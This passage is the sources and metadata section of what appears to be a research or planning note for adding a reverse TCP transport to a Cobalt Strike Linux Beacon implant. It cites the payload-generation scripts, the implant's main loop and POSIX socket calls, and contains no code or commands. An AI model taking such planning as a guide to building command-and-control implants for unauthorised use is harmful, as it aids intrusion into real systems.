- Direct source inspection of `/opt/CobaltStrike-Linux-Beacon/generate-payload/InsertListenerInfo.py` — current arg interface
- Direct source inspection of `/opt/CobaltStrike-Linux-Beacon/generate-payload/render_profile_header.py` — profile header generation
- Direct source inspection of `/opt/CobaltStrike-Linux-Beacon/implant/src/main.c` — main loop and transport call sites
- Direct source inspection of `/opt/CobaltStrike-Linux-Beacon/.planning/phases/03-reverse-tcp-transport/03-CONTEXT.md` — all locked decisions

### Secondary (MEDIUM confidence)
- POSIX.1-2017: `getaddrinfo()`, `connect()`, `send()`, `recv()`, `SO_KEEPALIVE`, `SO_SNDTIMEO`, `SO_RCVTIMEO`, `MSG_NOSIGNAL` — standard Linux POSIX headers, verified against known-good behavior on Linux x64

### Tertiary (LOW confidence — no external search needed; all findings are codebase-derived)
- None

---

## Metadata

**Confidence breakdown:**
- Standard stack: HIGH — all libraries are POSIX headers already used in the project
- Architecture patterns: HIGH — derived directly from `http.c` shape and CONTEXT decisions
- Pitfalls: HIGH — derived from C socket programming fundamentals and direct code inspection
- CNA patterns: HIGH — derived from existing CNA code and CONTEXT decisions
- Python migration: HIGH — derived from existing `InsertListenerInfo.py` and CONTEXT decisions

**Research date:** 2026-02-26
**Valid until:** 2026-05-26 (stable domain — POSIX sockets and Aggressor CNA are not fast-moving)
